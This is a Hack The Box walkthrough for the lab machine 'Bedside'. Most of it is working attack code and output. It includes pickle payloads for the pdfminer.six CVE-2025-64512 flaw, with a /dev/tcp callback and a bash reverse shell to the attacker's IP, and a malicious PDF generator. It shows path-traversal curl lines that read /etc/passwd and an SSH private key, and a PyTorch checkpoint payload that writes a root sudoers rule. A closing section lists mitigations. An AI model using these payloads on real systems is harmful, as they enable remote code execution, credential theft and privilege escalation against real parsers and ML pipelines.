
<!--
  Bedside HTB Complete Walkthrough
  Best viewed in: Obsidian Reading View, VS Code Markdown Preview, Typora, or any renderer with HTML + Mermaid support.
  The CSS animation is optional. If your renderer strips animations, the technical walkthrough remains fully readable.
-->

<style>
:root {
  --bg: #0b1020;
  --panel: #111827;
  --text: #e5e7eb;
  --muted: #9ca3af;
  --cyan: #38bdf8;
  --green: #22c55e;
  --orange: #fb923c;
  --red: #ef4444;
  --purple: #a78bfa;
  --border: rgba(255,255,255,0.12);
}
.htb-hero {
  padding: 28px;
  border-radius: 22px;
  background:
    radial-gradient(circle at 15% 20%, rgba(56,189,248,.30), transparent 35%),
    radial-gradient(circle at 85% 15%, rgba(167,139,250,.28), transparent 34%),
    linear-gradient(135deg, #0b1020, #111827 55%, #0f172a);
  border: 1px solid var(--border);
  color: var(--text);
  box-shadow: 0 18px 50px rgba(0,0,0,.35);
  overflow: hidden;
  position: relative;
}
.htb-hero:after {
  content: "";
  position: absolute;
  width: 220px;
  height: 220px;
  right: -60px;
  top: -60px;
  border-radius: 50%;
  background: conic-gradient(from 180deg, transparent, rgba(56,189,248,.45), rgba(34,197,94,.38), transparent);
  filter: blur(4px);
  animation: spin 9s linear infinite;
}
.htb-title { font-size: 2.25rem; font-weight: 900; letter-spacing: -0.04em; margin: 0; }
.htb-subtitle { margin-top: 10px; color: var(--muted); font-size: 1rem; }
.badge-row { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 18px; }
.badge {
  padding: 6px 12px;
  border-radius: 999px;
  background: rgba(255,255,255,.08);
  border: 1px solid var(--border);
  color: #dbeafe;
  font-weight: 700;
  font-size: .82rem;
}
.pulse {
  display: inline-block;
  width: 9px;
  height: 9px;
  margin-right: 7px;
  border-radius: 50%;
  background: var(--green);
  box-shadow: 0 0 0 rgba(34,197,94,.8);
  animation: pulse 1.8s infinite;
}
.attack-card, .tip-card, .warn-card, .fail-card {
  padding: 14px 16px;
  border-radius: 12px;
  margin: 16px 0;
  background: rgba(17,24,39,.42);
  border: 1px solid var(--border);
}
.attack-card { border-left: 4px solid var(--cyan); }
.tip-card { border-left: 4px solid var(--green); }
.warn-card { border-left: 4px solid var(--orange); }
.fail-card { border-left: 4px solid var(--red); }
.timeline { counter-reset: step; margin: 20px 0; }
.timeline-item {
  counter-increment: step;
  position: relative;
  margin: 0 0 14px 0;
  padding: 12px 16px 12px 52px;
  border: 1px solid var(--border);
  background: rgba(17,24,39,.55);
  border-radius: 14px;
}
.timeline-item:before {
  content: counter(step);
  position: absolute;
  left: 14px;
  top: 12px;
  width: 26px;
  height: 26px;
  border-radius: 50%;
  display: grid;
  place-items: center;
  color: #020617;
  background: linear-gradient(135deg, var(--cyan), var(--green));
  font-weight: 900;
}
@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
@keyframes pulse {
  0% { box-shadow: 0 0 0 0 rgba(34,197,94,.65); }
  70% { box-shadow: 0 0 0 12px rgba(34,197,94,0); }
  100% { box-shadow: 0 0 0 0 rgba(34,197,94,0); }
}
</style>

<div class="htb-hero">
  <h1 class="htb-title">Bedside — Hack The Box Complete Walkthrough</h1>
  <p class="htb-subtitle"><span class="pulse"></span>VHost discovery → pdfminer RCE → container pivot → internal LFI → SSH key theft → PyTorch checkpoint privesc → root.</p>
  <div class="badge-row">
    <span class="badge">Linux</span>
    <span class="badge">Apache</span>
    <span class="badge">pdfminer.six</span>
    <span class="badge">Docker</span>
    <span class="badge">Path Traversal</span>
    <span class="badge">PyTorch Pickle RCE</span>
  </div>
</div>

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Attack Chain Map](#attack-chain-map)
- [Knowledge Gaps Covered](#knowledge-gaps-covered)
- [Phase 1 — Recon](#phase-1--recon)
- [Phase 2 — VHost Discovery](#phase-2--vhost-discovery)
- [Phase 3 — Research Portal Enumeration](#phase-3--research-portal-enumeration)
- [Phase 4 — pdfminer.six RCE](#phase-4--pdfminersix-rce)
- [Phase 5 — Container Enumeration](#phase-5--container-enumeration)
- [Phase 6 — Internal Image Viewer Path Traversal](#phase-6--internal-image-viewer-path-traversal)
- [Phase 7 — SSH as Developer](#phase-7--ssh-as-developer)
- [Phase 8 — Privilege Escalation via PyTorch Checkpoint](#phase-8--privilege-escalation-via-pytorch-checkpoint)
- [Troubleshooting Notes](#troubleshooting-notes)
- [Mitigation Lessons](#mitigation-lessons)
- [Final Command Recap](#final-command-recap)
- [References](#references)

---

## Executive Summary

Bedside is a chained exploitation machine. The public site redirects to `bedside.htb`, and vhost fuzzing reveals `research.bedside.htb`. The research portal accepts uploads and exposes signs of `pdfminer.six` processing. By abusing CVE-2025-64512, a crafted PDF references an uploaded malicious `.pickle.gz` CMap file and triggers code execution inside the PDF worker container as `datawrangler`.

From the container, internal enumeration reveals a localhost-only service on `127.0.0.1:3000`, titled **Bedside Clinic - Image Viewer**. That development service has path traversal, allowing reads such as `/etc/passwd` and `/home/developer/.ssh/id_rsa`. The SSH private key gives host access as `developer`.

Privilege escalation comes from this sudo rule:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The trainer auto-loads the newest PyTorch checkpoint from `/datastore/checkpoints/*.pt`. The `developer` user cannot write `/datastore`, but the earlier `datawrangler` container shell can. A malicious checkpoint is placed into `/datastore/checkpoints`, and the trainer loads it as root. The working payload writes a sudoers rule for `developer`, then `sudo -n bash` gives root.

<div class="attack-card">
<strong>Final result:</strong> root access obtained and <code>/root/root.txt</code> captured.
</div>

---

## Attack Chain Map

```mermaid
flowchart LR
    A[Nmap: 22, 80, 3000 filtered] --> B[VHost fuzzing]
    B --> C[research.bedside.htb]
    C --> D[Upload portal]
    D --> E[pdfminer.six clue]
    E --> F[CVE-2025-64512 CMap pickle RCE]
    F --> G[datawrangler container shell]
    G --> H[/datastore shared volume]
    G --> I[localhost:3000 internal viewer]
    I --> J[Path traversal / LFI]
    J --> K[Read developer SSH key]
    K --> L[SSH as developer]
    L --> M[sudo trainer script]
    H --> N[Write malicious PyTorch checkpoint]
    N --> M
    M --> O[Root checkpoint deserialization]
    O --> P[Write sudoers rule]
    P --> Q[root shell]
```

---

## Knowledge Gaps Covered

<div class="timeline">
  <div class="timeline-item"><strong>Virtual hosts:</strong> One IP can host multiple sites. If only the IP is browsed, hidden apps may be missed.</div>
  <div class="timeline-item"><strong>Backend workers:</strong> Upload success does not always mean immediate execution. Background parsers often process files after upload.</div>
  <div class="timeline-item"><strong>Python pickle:</strong> Pickle is not passive data. Deserializing attacker-controlled pickle can execute commands.</div>
  <div class="timeline-item"><strong>Container pivots:</strong> A Docker shell is usually not the final host shell. Mounted volumes and localhost-only services are key pivots.</div>
  <div class="timeline-item"><strong>Path traversal:</strong> If a static server mishandles <code>../</code>, files outside the intended web root can be read.</div>
  <div class="timeline-item"><strong>Sudo exact command matching:</strong> A sudoers rule can allow one exact command only. Extra arguments can force a password prompt.</div>
  <div class="timeline-item"><strong>ML model security:</strong> PyTorch checkpoints can carry pickle payloads, so model files must be treated as executable content.</div>
</div>

---

## Phase 1 — Recon

Target:

```text
10.129.55.190
```

Initial scan:

```bash
nmap -sC -sV 10.129.55.190
```

Important output:

```text
22/tcp   open      ssh       OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp   open      http      Apache httpd 2.4.68
3000/tcp filtered  ppp
http-title: redirect to http://bedside.htb/
```

Add hostname:

```bash
echo "10.129.55.190 bedside.htb" | sudo tee -a /etc/hosts
```

<div class="tip-card">
<strong>Tip:</strong> If a page redirects to a hostname on HTB, add it to <code>/etc/hosts</code> before deeper web enumeration.
</div>

---

## Phase 2 — VHost Discovery

VHost fuzzing discovered:

```text
research                [Status: 200, Size: 3152, Words: 313, Lines: 80]
```

Add the vhost:

```bash
echo "10.129.55.190 bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts
```

Browse:

```text
http://research.bedside.htb/
```

The page is a research upload portal.

---

## Phase 3 — Research Portal Enumeration

The portal advertises these accepted file types:

```text
jpeg, jpg, png, bmp, tiff, dcm, pdf
```

Testing a rejected file:

```bash
echo test > test.txt
curl -i -s -F "uploadFile=@test.txt;filename=test.txt" http://research.bedside.htb/
```

Response:

```html
<div class="message">Invalid file type. Allowed: jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip</div>
```

That revealed two useful extra extensions:

```text
gz, zip
```

Testing a broken PDF leaked the upload destination:

```bash
echo "not a real pdf" > broken.pdf
curl -i -s -F "uploadFile=@broken.pdf;filename=broken.pdf" http://research.bedside.htb/ | grep -Ei "message|error|traceback|warning|failed|invalid|uploaded"
```

Leak:

```html
<div class="message">MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads</div>
```

Important path:

```text
/var/www/research.bedside.htb/uploads
```

Technology clue:

```bash
whatweb http://research.bedside.htb/
```

Output included:

```text
X-Powered-By[pdfminer.six]
```

<div class="attack-card">
<strong>Key observation:</strong> Accepted <code>.gz</code> uploads plus <code>pdfminer.six</code> strongly suggests a CMap pickle deserialization route.
</div>

---

## Phase 4 — pdfminer.six RCE

### Why It Works

`pdfminer.six` can load compressed CMap pickle files. In CVE-2025-64512, a crafted PDF can influence which `.pickle.gz` CMap file is loaded, leading to unsafe pickle deserialization and arbitrary code execution.

The worker confirmed the vulnerable version:

```text
pdfminer.six==20250506
```

### Build a Callback Pickle

Use a callback before a reverse shell. It proves execution and shows which user executed the payload.

```bash
cat > make_pickle.py <<'PY'
import pickle, gzip

LHOST = "10.10.14.130"
cmd = f"bash -c 'exec 3<>/dev/tcp/{LHOST}/8000; echo -e \"GET /$(id|base64 -w0) HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n\" >&3'"

class RCE:
    def __reduce__(self):
        return (eval, (f"(__import__('os').system({cmd!r}), {{}})[1]",))

with gzip.open("pwn.pickle.gz", "wb") as f:
    pickle.dump(RCE(), f)
PY

python3 make_pickle.py
cp pwn.pickle.gz pwn.pickle.gz.pickle.gz
```

Why duplicate the file?

```text
pdfminer appends .pickle.gz internally.
If the PDF references pwn.pickle.gz, pdfminer may look for pwn.pickle.gz.pickle.gz.
```

Upload both:

```bash
curl -s -F "uploadFile=@pwn.pickle.gz;filename=pwn.pickle.gz" http://research.bedside.htb/
curl -s -F "uploadFile=@pwn.pickle.gz.pickle.gz;filename=pwn.pickle.gz.pickle.gz" http://research.bedside.htb/
```

Start listener:

```bash
nc -lvnp 8000
```

### Generate the Malicious PDF

```bash
cat > make_pdf_exact.py <<'PY'
import sys

path = sys.argv[1]
out = sys.argv[2]
enc = "/" + path.replace("/", "#2F")

objects = [
"<< /Type /Catalog /Pages 2 0 R >>",
"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
"<< /Length 44 >>\nstream\nBT\n/F1 12 Tf\n100 700 Td\n(Malicious PDF) Tj\nET\nendstream",
f"<< /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding {enc} /DescendantFonts [6 0 R] >>",
"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >>",
"<< /Type /FontDescriptor /FontName /MaliciousFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>"
]

pdf = b"%PDF-1.4\n"
offsets = [0]
for i, obj in enumerate(objects, 1):
    offsets.append(len(pdf))
    pdf += f"{i} 0 obj\n{obj}\nendobj\n".encode()

xref = len(pdf)
pdf += f"xref\n0 {len(objects)+1}\n0000000000 65535 f \n".encode()
for off in offsets[1:]:
    pdf += f"{off:010d} 00000 n \n".encode()
pdf += f"trailer\n<< /Size {len(objects)+1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()

open(out, "wb").write(pdf)
print(enc)
PY
```

Trigger with common possible worker paths:

```bash
i=0; for p in \
"/var/www/research.bedside.htb/uploads/pwn" \
"/var/www/research.bedside.htb/uploads/pwn.pickle.gz" \
"/app/uploads/pwn" \
"/app/uploads/pwn.pickle.gz" \
"/uploads/pwn" \
"/uploads/pwn.pickle.gz" \
"uploads/pwn" \
"uploads/pwn.pickle.gz"; do \
i=$((i+1)); f="evil_$i.pdf"; echo "[*] $i $p"; \
python3 make_pdf_exact.py "$p" "$f" >/dev/null; \
curl -s -F "uploadFile=@$f;filename=$f" http://research.bedside.htb/; \
curl -s -o /dev/null http://research.bedside.htb/uploads/$f; \
sleep 3; done
```

Callback received:

```text
GET /dWlkPTk4OChkYXRhd3JhbmdsZXIpIGdpZD0xMDAxKGRhdGFvcHMpIGdyb3Vwcz0xMDAxKGRhdGFvcHMpCg== HTTP/1.1
```

Decode:

```bash
echo 'dWlkPTk4OChkYXRhd3JhbmdsZXIpIGdpZD0xMDAxKGRhdGFvcHMpIGdyb3Vwcz0xMDAxKGRhdGFvcHMpCg==' | base64 -d
```

Result:

```text
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

### Reverse Shell

Replace the callback with a reverse shell:

```bash
cat > make_pickle.py <<'PY'
import pickle, gzip

LHOST = "10.10.14.130"
LPORT = "4444"
cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

class RCE:
    def __reduce__(self):
        return (eval, (f"(__import__('os').system({cmd!r}), {{}})[1]",))

with gzip.open("pwn.pickle.gz", "wb") as f:
    pickle.dump(RCE(), f)
PY

python3 make_pickle.py
cp pwn.pickle.gz pwn.pickle.gz.pickle.gz
```

Upload both, start listener, and trigger with the PDF loop again:

```bash
curl -s -F "uploadFile=@pwn.pickle.gz;filename=pwn.pickle.gz" http://research.bedside.htb/
curl -s -F "uploadFile=@pwn.pickle.gz.pickle.gz;filename=pwn.pickle.gz.pickle.gz" http://research.bedside.htb/
nc -lvnp 4444
```

Shell:

```text
datawrangler@data-wrangler:/app$
```

---

## Phase 5 — Container Enumeration

Inside the container:

```bash
id
hostname
ls -la /app
cat /app/pdf_watcher.py
cat /app/requirements.txt
```

Interesting files:

```text
/app/pdf_watcher.py
/app/requirements.txt
```

`requirements.txt`:

```text
pdfminer.six==20250506
```

Important `pdf_watcher.py` paths:

```python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"
```

Mount enumeration:

```bash
mount | grep -Ei "datastore|uploads|docker|overlay|bind"
```

Important output:

```text
/dev/sda4 on /datastore type ext4 (rw,relatime,errors=remount-ro)
/dev/sda4 on /var/www/research.bedside.htb/uploads type ext4 (rw,relatime,errors=remount-ro)
```

`/datastore` structure:

```bash
ls -la /datastore
for d in /datastore/*; do echo "===== $d ====="; ls -la "$d"; done
```

```text
/datastore/checkpoints
/datastore/logs
/datastore/models
/datastore/processed
/datastore/raw
/datastore/staging
```

<div class="tip-card">
<strong>Tip:</strong> Shared mounts are major pivot points. Here, <code>datawrangler</code> can write to <code>/datastore</code>, which later controls root's checkpoint load path.
</div>

---

## Phase 6 — Internal Image Viewer Path Traversal

External `3000/tcp` was filtered, but inside the container it was reachable:

```bash
for h in 127.0.0.1 localhost; do
  for p in 22 80 3000 5000 8000 8080 9000; do
    timeout 1 bash -c "</dev/tcp/$h/$p" 2>/dev/null && echo "$h:$p open"
  done
done
```

Output:

```text
127.0.0.1:22 open
127.0.0.1:80 open
127.0.0.1:3000 open
localhost:22 open
localhost:80 open
localhost:3000 open
```

Fetch the app:

```bash
curl -s -i http://127.0.0.1:3000/ | head -80
```

Title:

```html
<title>Bedside Clinic - Image Viewer</title>
```

The page imports local vendor files:

```javascript
import React from './vendor/react.js';
import ReactDOM from './vendor/react-dom.js';
import _ from './vendor/lodash.js';
```

### Confirm Traversal

Use `--path-as-is` so curl does not normalize the traversal away:

```bash
for p in \
"/../../../../etc/passwd" \
"/..%2f..%2f..%2f..%2fetc%2fpasswd" \
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"; do \
echo "===== $p ====="; \
curl --path-as-is -s "http://127.0.0.1:3000$p" | head -8; \
done
```

Success:

```text
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000::/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
```

List shell users:

```bash
curl --path-as-is -s "http://127.0.0.1:3000/../../../../etc/passwd" | awk -F: '$7 ~ /bash|sh/ {print $1 ":" $6 ":" $7}'
```

Output:

```text
root:/root:/bin/bash
developer:/home/developer:/bin/bash
datawrangler:/home/datawrangler:/bin/sh
```

Read developer SSH key:

```bash
curl --path-as-is -s "http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa"
```

Output:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

---

## Phase 7 — SSH as Developer

Save the key on the attacker machine:

```bash
cat > developer_id_rsa <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
PASTE_KEY_HERE
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 developer_id_rsa
```

SSH:

```bash
ssh -i developer_id_rsa developer@10.129.55.190
```

Read user flag:

```bash
cat ~/user.txt
```

Captured:

```text
09d1dde15678094a16bb20ccde92282b
```

<div class="warn-card">
<strong>Publishing note:</strong> Redact flags before posting publicly.
</div>

---

## Phase 8 — Privilege Escalation via PyTorch Checkpoint

### Sudo Enumeration

```bash
sudo -l
```

Output:

```text
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Important:

```text
Only the exact command is allowed.
Do not add /tmp/pwn.pt, --checkpoint, or any other argument.
```

Correct trigger:

```bash
sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

### Vulnerable Trainer Logic

Read it:

```bash
cat /opt/trainer/bedside_trainer.py
```

Important paths:

```python
DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
STAGING_DIR = DATASTORE_ROOT / "staging"
```

Checkpoint discovery:

```python
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None
```

Checkpoint load:

```python
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    loader(engine)
```

### Why It Works

The script runs as root and loads attacker-controlled `.pt` files from `/datastore/checkpoints`. PyTorch checkpoint loading is pickle-backed. A malicious object with `__reduce__()` executes code during deserialization.

### Permission Split

As `developer`:

```bash
id; ls -ld /datastore /datastore/checkpoints /datastore/processed; touch /datastore/checkpoints/test 2>&1
```

Output:

```text
uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
ls: cannot access '/datastore/checkpoints': Permission denied
ls: cannot access '/datastore/processed': Permission denied
drwxrwx--- 8 datawrangler dataops 4096 Jul 13 14:00 /datastore
touch: cannot touch '/datastore/checkpoints/test': Permission denied
```

So:

```text
developer can run the root trainer.
datawrangler can write the checkpoint.
Both shells are needed for the clean exploit.
```

### Failed SUID Bash Attempt

A payload created `/tmp/rootbash`:

```text
-rwsr-xr-x 1 root root 1298416 /tmp/rootbash
```

But running it did not preserve root privileges:

```bash
/tmp/rootbash -p
id
```

Still showed:

```text
uid=1000(developer) gid=1000(developer)
```

<div class="fail-card">
<strong>Lesson:</strong> The payload executed, but SUID was neutralized. Use a sudoers payload instead.
</div>

### Final Working Payload

On `developer`, create the malicious checkpoint:

```bash
cat > /tmp/make_sudo_ckpt.py <<'PY'
import torch, os
class RCE:
    def __reduce__(self):
        cmd = "printf 'developer ALL=(ALL) NOPASSWD:ALL\n' > /etc/sudoers.d/developer && chmod 440 /etc/sudoers.d/developer"
        return (os.system, (cmd,))
torch.save({"model": RCE(), "optimizer": {}, "epoch": 1}, "/tmp/sudo_root.pt")
PY
python3 /tmp/make_sudo_ckpt.py
```

Serve it from the developer shell:

```bash
cd /tmp && python3 -m http.server 9001 --bind 127.0.0.1
```

On the `datawrangler` container shell, pull it into the checkpoint directory:

```bash
rm -f /datastore/checkpoints/*.pt 2>/dev/null; curl -s http://127.0.0.1:9001/sudo_root.pt -o /datastore/checkpoints/zzz_root.pt; ls -la /datastore/checkpoints/zzz_root.pt
```

Ensure trainer has one valid processed image:

```bash
python3 -c "import base64,pathlib; pathlib.Path('/datastore/processed/a.png').write_bytes(base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/p9sAAAAASUVORK5CYII='))"
```

Back on `developer`, stop the server with `Ctrl+C`, then run:

```bash
sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Expected output:

```text
INFO | Found checkpoint /datastore/checkpoints/zzz_root.pt, loading with CheckpointLoader (callable mode)...
TypeError: Expected state_dict to be dict-like, got <class 'int'>.
```

Ignore the traceback. The payload already executed.

Get root:

```bash
sudo -n bash
id
cat /root/root.txt
```

Captured:

```text
540ebbd698b37de9a883c79af148dd1f
```

---

## Troubleshooting Notes

### Sudo asks for password

Wrong:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py /tmp/pwn.pt
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py --checkpoint /tmp/pwn.pt
```

Correct:

```bash
sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

### Developer cannot write `/datastore`

Use the `datawrangler` container shell.

### Multiline paste is hard in the reverse shell

Use HTTP transfer:

```bash
# developer shell
cd /tmp && python3 -m http.server 9001 --bind 127.0.0.1
```

```bash
# datawrangler shell
curl -s http://127.0.0.1:9001/sudo_root.pt -o /datastore/checkpoints/zzz_root.pt
```

### Trainer crashes after checkpoint loading

The crash is acceptable. The malicious object has already been deserialized.

### `/tmp/rootbash` does not work

Use sudoers write instead of SUID bash.

---

## Mitigation Lessons

### Upload and PDF Processing

- Patch vulnerable parser libraries.
- Do not process untrusted files with unsafe deserialization paths.
- Run parsers in isolated sandboxes with no sensitive mounts.
- Avoid predictable, web-accessible upload paths.

### Internal Services

- Localhost-only services still need access control.
- Static servers must normalize paths safely.
- Development servers should not run in production-like environments.

### Secrets

- Do not store SSH private keys where a web service can read them.
- Use passphrases and restricted deployment keys.
- Audit file permissions around home directories and `.ssh` directories.

### ML Infrastructure

- Treat `.pt`, `.pth`, `.ckpt`, `.pkl`, and `.pickle` as executable content.
- Avoid loading untrusted checkpoints as privileged users.
- Prefer safer formats such as `safetensors` where possible.
- Enforce file ownership checks before root-owned training jobs load model artifacts.

---

## Final Command Recap

### Internal LFI to SSH Key

```bash
curl --path-as-is -s "http://127.0.0.1:3000/../../../../etc/passwd"
curl --path-as-is -s "http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa"
```

### SSH as Developer

```bash
chmod 600 developer_id_rsa
ssh -i developer_id_rsa developer@10.129.55.190
cat ~/user.txt
```

### Root Payload

```bash
cat > /tmp/make_sudo_ckpt.py <<'PY'
import torch, os
class RCE:
    def __reduce__(self):
        cmd = "printf 'developer ALL=(ALL) NOPASSWD:ALL\n' > /etc/sudoers.d/developer && chmod 440 /etc/sudoers.d/developer"
        return (os.system, (cmd,))
torch.save({"model": RCE(), "optimizer": {}, "epoch": 1}, "/tmp/sudo_root.pt")
PY
python3 /tmp/make_sudo_ckpt.py
cd /tmp && python3 -m http.server 9001 --bind 127.0.0.1
```

On `datawrangler`:

```bash
rm -f /datastore/checkpoints/*.pt 2>/dev/null; curl -s http://127.0.0.1:9001/sudo_root.pt -o /datastore/checkpoints/zzz_root.pt; python3 -c "import base64,pathlib; pathlib.Path('/datastore/processed/a.png').write_bytes(base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/p9sAAAAASUVORK5CYII='))"
```

Back on `developer`:

```bash
sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
sudo -n bash
id
cat /root/root.txt
```

---

## Optional Cleanup After Root

```bash
rm -f /etc/sudoers.d/developer
rm -f /tmp/rootbash /tmp/sudo_root.pt /tmp/zzz_root.pt
rm -f /datastore/checkpoints/zzz_root.pt
```

---

## References

- GitHub Advisory Database — CVE-2025-64512 / GHSA-wf5f-4jwr-ppcp: `https://github.com/advisories/GHSA-wf5f-4jwr-ppcp`
- NVD — CVE-2025-64512: `https://nvd.nist.gov/vuln/detail/CVE-2025-64512`
- PyTorch Documentation — `torch.load`: `https://docs.pytorch.org/docs/stable/generated/torch.load.html`
- PyTorch Serialization Notes: `https://docs.pytorch.org/docs/main/notes/serialization.html`

---

## Final Proof

```text
user.txt: 09d1dde15678094a16bb20ccde92282b
root.txt: 540ebbd698b37de9a883c79af148dd1f
```

<div class="htb-hero">
  <h1 class="htb-title">Rooted.</h1>
  <p class="htb-subtitle"><span class="pulse"></span>Bedside exploitation complete: parser RCE, internal LFI, SSH pivot, ML checkpoint deserialization privesc.</p>
</div>
